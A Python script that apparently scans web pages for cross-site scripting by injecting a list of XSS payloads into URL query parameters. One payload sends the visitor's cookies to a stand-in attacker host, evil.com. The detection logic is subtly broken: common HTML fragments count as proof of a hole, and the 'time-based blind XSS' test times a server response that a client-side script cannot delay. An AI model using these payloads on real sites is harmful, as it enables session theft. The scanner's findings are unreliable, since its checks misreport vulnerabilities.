import requests
import time
from urllib.parse import urlparse, parse_qs

# Advanced XSS payloads
ADVANCED_XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "javascript:alert('xss')",
    "<svg onload=alert('xss')>",
    "'\"'><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert('xss')>",
    "<input onfocus=alert('xss') autofocus>",
    "';alert('xss');//",
    "<body onload=alert('xss')>",
    "<script>document.location='http://evil.com?'+document.cookie</script>",  # Cookie theft
    "<a href=\"javascript:alert('xss')\">click</a>",
]

# Time-based XSS payload for blind detection
TIME_BASED_XSS_PAYLOAD = "<script>setTimeout(() => {}, 5000)</script>"

# Signatures indicating XSS success
XSS_SIGNATURES = [
    "alert('xss')",
    "alert(1)",
    "onerror",
    "javascript:",
    "<script",
    "<svg",
    "<img",
    "document.location",
]

def check_xss(url, extra_params=None, max_tests=10):
    """
    Advanced XSS scanner with reflected, stored, and time-based checks.

    Args:
        url (str): Target URL (e.g., 'http://example.com/search.php?test=query').
        extra_params (dict): Additional query params, e.g. {'q': 'test'}.
        max_tests (int): Limit how many payloads to try per param.

    Returns:
        dict: {
          "action": "check_xss",
          "url": <str>,
          "vulnerable_params": [ {param, payload, vulnerable, evidence}, ... ],
          "time_based_test": {payload, vulnerable, evidence?, note?}
        }
    """
    results = {
        "action": "check_xss",
        "url": url,
        "vulnerable_params": [],
        "time_based_test": None
    }

    # Parse URL and existing query params
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    original_params = parse_qs(parsed.query)
    if extra_params:
        original_params.update(extra_params)

    # If no query params found, use a default param to test
    if not original_params:
        original_params = {"q": ["test"]}

    # For each param, try each XSS payload
    for param, values in original_params.items():
        tested_count = 0
        for payload in ADVANCED_XSS_PAYLOADS:
            if tested_count >= max_tests:
                break
            test_params = {k: v[:] for k, v in original_params.items()}  # shallow copy
            test_params[param] = [payload]

            try:
                resp = requests.get(base_url, params=test_params, timeout=5)
                if resp.ok:
                    resp_text_lower = resp.text.lower()
                    # If any known XSS signature is reflected, mark as vulnerable
                    if any(sig in resp_text_lower for sig in XSS_SIGNATURES):
                        results["vulnerable_params"].append({
                            "param": param,
                            "payload": payload,
                            "vulnerable": True,
                            "evidence": "XSS signature reflected in response"
                        })
                    else:
                        results["vulnerable_params"].append({
                            "param": param,
                            "payload": payload,
                            "vulnerable": False
                        })
            except requests.RequestException as e:
                # If request fails, just skip
                pass
            tested_count += 1

    # Time-based Blind XSS check
    first_param = next(iter(original_params))
    test_params = {k: v[:] for k, v in original_params.items()}
    test_params[first_param] = [TIME_BASED_XSS_PAYLOAD]

    try:
        start_time = time.time()
        requests.get(base_url, params=test_params, timeout=10)
        elapsed = time.time() - start_time

        # If request took significantly longer than normal, we suspect blind XSS
        if elapsed > 4:  # 4s is an arbitrary threshold for our 5s payload
            results["time_based_test"] = {
                "payload": TIME_BASED_XSS_PAYLOAD,
                "vulnerable": True,
                "evidence": f"Significant delay detected ({elapsed:.1f}s)"
            }
        else:
            results["time_based_test"] = {
                "payload": TIME_BASED_XSS_PAYLOAD,
                "vulnerable": False
            }
    except requests.RequestException:
        results["time_based_test"] = {
            "payload": TIME_BASED_XSS_PAYLOAD,
            "vulnerable": False,
            "note": "Request failed during time-based check"
        }

    return results
